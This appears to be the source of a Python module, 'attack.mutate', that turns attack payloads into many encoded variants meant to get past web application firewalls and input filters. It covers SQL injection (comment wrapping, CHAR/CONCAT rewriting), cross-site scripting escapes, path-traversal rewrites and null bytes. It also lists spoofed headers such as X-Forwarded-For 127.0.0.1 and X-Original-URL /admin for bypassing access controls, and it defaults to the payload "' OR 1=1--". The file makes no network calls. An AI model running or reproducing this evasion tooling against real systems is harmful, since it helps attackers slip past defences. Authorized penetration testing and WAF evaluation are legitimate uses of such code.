"""
attack.mutate — payload mutation engine.
Feed a payload, get N mutated variants aimed at common WAF/filter bypasses.
No network. Pure transform.
"""
import re
import urllib.parse


def case_flip(p):
    """RaNdOm case the whole string."""
    out = []
    for i, c in enumerate(p):
        out.append(c.upper() if i % 2 == 0 else c.lower())
    return "".join(out)


def double_url_encode(p):
    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")


def url_encode(p):
    return urllib.parse.quote(p, safe="")


def hex_escape(p):
    """Replace letters with %XX hex escapes, mixed case."""
    out = []
    for i, c in enumerate(p):
        if c.isalpha() and i % 2 == 0:
            out.append(f"%{ord(c):02x}")
        elif c.isalpha():
            out.append(f"%{ord(c):02X}")
        else:
            out.append(c)
    return "".join(out)


def whitespace_swap(p):
    """Replace spaces with tabs, newlines, vtab, formfeed."""
    variants = [
        p.replace(" ", "\t"),
        p.replace(" ", "\n"),
        p.replace(" ", "\x0b"),
        p.replace(" ", "\x0c"),
        p.replace(" ", "/**/"),
        p.replace(" ", "+"),
        p.replace(" ", "%20"),
        p.replace(" ", "%09"),
        p.replace(" ", "%0a"),
    ]
    return variants


def comment_inject_sql(p):
    """Wrap SQL keywords with inline comments."""
    keywords = ["union", "select", "from", "where", "and", "or", "order",
                "by", "having", "group", "insert", "update", "delete"]
    out = p
    for kw in keywords:
        out = re.sub(rf"\b{kw}\b", f"/*{kw}*/", out, flags=re.I)
    return out


def concat_swap(p):
    """Replace single-quoted literals with CONCAT/CHAR alternatives."""
    def repl(m):
        inner = m.group(1)
        parts = [f"CHAR({ord(c)})" for c in inner]
        return f"CONCAT({','.join(parts)})"
    return re.sub(r"'([^']{1,10})'", repl, p)


def unicode_escape(p):
    """JS-style unicode escapes."""
    return "".join(f"\\u{ord(c):04x}" if not c.isalnum() else c for c in p)


def html_entity(p):
    return "".join(f"&#x{ord(c):x};" if c in "<>\"'&" else c for c in p)


def null_byte(p):
    return p + "%00"


def path_traversal_swap(p):
    """For LFI payloads: rewrite ../../ chains."""
    variants = [
        p.replace("../", "....//"),
        p.replace("../", "..%2f"),
        p.replace("../", "%2e%2e/"),
        p.replace("../", "%2e%2e%2f"),
        p.replace("../", "..%252f"),
        p.replace("/", "\\"),
    ]
    return variants


def content_type_swap():
    return [
        "application/json",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
        "text/plain",
        "application/xml",
        "application/octet-stream",
    ]


def method_swap():
    return ["GET", "POST", "PUT", "PATCH", "OPTIONS", "HEAD"]


def header_bypass_headers():
    """Common headers that trick WAFs into allowing requests."""
    return {
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
        "X-Forwarded-Host": "localhost",
        "X-HTTP-Method-Override": "GET",
    }


def variants(payload, context=None):
    """
    Given a payload, return list of (label, mutated_payload) tuples.
    context = 'sql' | 'xss' | 'lfi' | 'cmd' | None
    """
    out = []
    out.append(("original", payload))
    out.append(("case_flip", case_flip(payload)))
    out.append(("url_encode", url_encode(payload)))
    out.append(("double_url_encode", double_url_encode(payload)))
    out.append(("hex_escape", hex_escape(payload)))
    for i, v in enumerate(whitespace_swap(payload)):
        out.append((f"ws_swap_{i}", v))
    out.append(("null_byte", null_byte(payload)))

    if context == "sql":
        out.append(("sql_comment", comment_inject_sql(payload)))
        out.append(("sql_concat", concat_swap(payload)))
    elif context == "xss":
        out.append(("html_entity", html_entity(payload)))
        out.append(("unicode_escape", unicode_escape(payload)))
    elif context == "lfi":
        for i, v in enumerate(path_traversal_swap(payload)):
            out.append((f"lfi_{i}", v))

    # dedupe, drop identical to original (keep original though)
    seen = set()
    deduped = []
    for label, v in out:
        if v in seen:
            continue
        seen.add(v)
        deduped.append((label, v))
    return deduped


def full_matrix(payload):
    """All transforms regardless of context. Returns (label, value) list."""
    return variants(payload, context=None) + \
           variants(payload, context="sql") + \
           variants(payload, context="xss") + \
           variants(payload, context="lfi")


if __name__ == "__main__":
    import json, sys
    if len(sys.argv) > 1:
        p = sys.argv[1]
        ctx = sys.argv[2] if len(sys.argv) > 2 else None
    else:
        p = "' OR 1=1--"
        ctx = "sql"
    print(f"payload: {p}")
    print(f"context: {ctx}")
    print()
    for label, v in variants(p, ctx):
        print(f"  {label:<20} {v}")
